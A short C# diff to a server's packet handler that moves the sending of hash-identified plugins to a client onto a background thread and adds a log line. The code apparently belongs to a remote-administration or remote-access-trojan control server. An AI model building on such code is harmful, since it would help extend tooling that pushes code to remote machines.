@@ -171,10 +171,13 @@ namespace Server.Handle_Packet
 
                         case "sendPlugin":
                             {
-                                foreach (string plguins in unpack_msgpack.ForcePathObject("Hashes").AsString.Split(','))
-                                {
-                                    client.SendPlugin(plguins.Trim());
-                                }
+                                new HandleLogs().Addmsg($"Sending plugins to client {ip} please wait..", Color.Blue);
+                                ThreadPool.QueueUserWorkItem(delegate {
+                                    foreach (string plugin in unpack_msgpack.ForcePathObject("Hashes").AsString.Split(','))
+                                    {
+                                        client.SendPlugin(plugin);
+                                    }
+                                });
                                 break;
                             }
 
